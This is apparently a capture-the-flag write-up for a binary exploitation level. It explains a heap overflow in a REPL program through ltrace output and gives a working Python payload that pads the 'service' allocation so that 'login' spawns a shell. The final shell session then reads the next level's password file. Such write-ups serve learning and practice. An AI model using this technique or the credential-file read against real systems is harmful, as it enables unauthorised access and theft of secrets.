# Level 8

## Initial Context

- One file: `level8`

## Solving the Challenge

The executable is a REPL, meaning it waits for an input line and do thing accordingly.

By rewriting the code in C, we can see that 4 commands are possible:
- auth
- reset
- service
- login

If run using `ltrace`, we can see that the `auth` command only allocate `4 bytes`, followed another allocation if we do the `service` command.

```bash
$ ltrace ./level8
...
printf("%p, %p \n", (nil), (nil))           = 14
fgets("auth abc\n", 128, 0xb7fd1ac0)        = 0xbffff6e0
malloc(4)                                   = 0x0804a008 # first
strcpy(0x0804a008, "abc\n")                 = 0x0804a008
printf("%p, %p \n", 0x804a008, (nil))       = 18
fgets("service abc\n", 128, 0xb7fd1ac0)     = 0xbffff6e0
strdup("service abc\n")                     = 0x0804a018 # second
printf("%p, %p \n", 0x804a008, 0x804a0180)  = 22
...
```

These two allocation are only `16 bytes` off (or `0x10`).

The `login` command check the memory allocated by `auth + 32 bytes`. But the `auth` command has a restriction of `31` bytes.
We have to find another way.

Since `service`'s allocation is only `16 bytes` after, we can fill it with another `16 bytes` to be at `auth + 32 bytes`.

The program will give us a shell if the value is anything except zero.

So here is the payload:

```python
# first command
print "auth ";

# second command
print "service" + "A" * 16;

# third command
print "login"
```

Let's save it in a file and send it to the vulnerable program:

```bash
$ python -c 'print "auth "; print "service" + "A" * 16; print "login"' > /tmp/exploit8
$ cat /tmp/exploit8 - | ./level8
whoami
level9
cat /home/user/level9/.pass
<flag>
```
